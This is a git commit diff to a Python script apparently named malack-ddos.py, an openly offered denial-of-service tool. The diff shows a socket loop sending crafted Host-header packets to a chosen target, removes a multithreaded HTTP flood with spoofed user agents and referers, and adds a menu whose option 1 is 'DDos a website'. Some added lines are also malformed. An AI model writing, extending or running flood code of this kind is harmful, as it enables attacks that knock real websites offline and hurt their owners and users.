949e480098418ca19098756f4d3ac96470b30adb
abatatsa99 <abatatsa311@gmail.com>
2025-09-19 08:24:49 +0700

    Update malack-ddos.py

--- malack-ddos.py
+++ malack-ddos.py
@@ -51,7 +51,7 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                print("[💥]  \033[93mTL-DD0S  \033[32mAttack number \033[97m——> \033[0m"+ str(attack_num))
+                print(f"[💥] {Fore.YELLOW}Malack-313 {Fore.GREEN}Attack number {Fore.CYAN}——> {Fore.MAGENTA} "+ str(attack_num))
             except socket.error:
                 print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
                 break
@@ -78,70 +78,31 @@ def print_red_centered_art():
 \033[92m   ╚══╝  ════╝ ╝   ╚ ╚══╝ ╝   ╚    ╝   ╚ ╝   ╚ ╝     ╚    ╚  \033[0m
 
 \033[33m══════════════════════ \033[37mJ A N C O K Z O S A N\033[33m ═════════════════════
-"""
-faded_text = fade.fire(logo)
-print(faded_text)
-ask = fade.pinkred("\033[33m⟩⟩URL Target:\033[31m ✓✓ \033[0m")
-url = input(ask)
-u = int(0)
-headers = []
-referer = [
-    "https://alibaba.com/",
-    "https://google.com/",
-    ]
-
-def useragent():
-    global headers
-    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
-    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
-    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
-    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
-    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
-    headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
-
-    return headers
-
-
-def genstr(size):
-    out_str = ''
-
-    for _ in range(0, size):
-        code = random.randint(65, 90)
-        out_str += chr(code)
-    
-    return out_str
-
-
-class httpth1(threading.Thread):
-    def run(self):
-        global u
-        while True:
-            try:
-                headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
-                randomized_url = url + "?" + genstr(random.randint(3, 10))
-                requests.get(randomized_url, headers=headers)
-                attack_num += 1
-                print("[⟨⟩]\033[31m▒" +str(u)+ "▒\033[37m Request Sent ▒\033[33m " +(url)+ "▒=⟩\033[0m" )      
-            except requests.exceptions.ConnectionError:
-                print("▒ ▒ ▒ \033[1mServer \033[4mMaybe\033[97m ▒ ▒ ▒ \033[35mDown ▒ ▒ \033[0m" )
-                pass
-            except requests.exceptions.InvalidSchema:
-                print ("[Finally attack]")
-                raise SystemExit()
-            except ValueError:
-                print ("[Check Your URL]")
-                raise SystemExit()
-            except KeyboardInterrupt:
-                print("[Canceled by User]")
-                raise SystemExit()
-
-
-while True:
-    try:
-        th1 = httpth1()
-        th1.start()
-    except Exception:
-        pass
-    except KeyboardInterrupt:
-        exit("[Canceled By User]")
-        raise SystemExit()
+'''
+red_art = f"{Fore.GREEN}{art}{Style.RESET_ALL}"  # Set the text color to red
+    print(red_art.center(80))  # Adjust the width (80 characters) to match your terminal size
+    #red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
+    red_art2 = f"{Fore.YELLOW}{Style.RESET_ALL}"
+    print((80))
+    print(Fore.YELLOW + Style.BRIGHT + "[Malack-313 dedication and struggle for PALESTINE]")
+if __name__ == "__main__":
+    print_red_centered_art()
+def menu():
+   # print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" Fore.WHITE + "Press CTRL + C and press enter to exit!!")
+    print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.BLUE + "Press CTRL + C and press enter to exit!!")
+    print(Fore.WHITE + Style.BRIGHT + "——————————————————————————————————————————————————————————————————")
+    print(Fore.YELLOW + Style.BRIGHT + "Silahkan ketik 1 untuk melanjutkan...")
+    print(Fore.BLUE + Style.BRIGHT + "1. DDos a website.  [1]")
+    print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
+    print("Enter your options .. [e.g 1,2]") 
+    global usr
+    usr = input(Fore.YELLOW + Style.BRIGHT + "0======>> " )
+    if usr == "1":
+        ddos()
+    elif usr == "2":
+        print("Exiting...")
+        time.sleep(1)
+    else:
+        print("invalid option..try again.")
+        menu()
+menu()
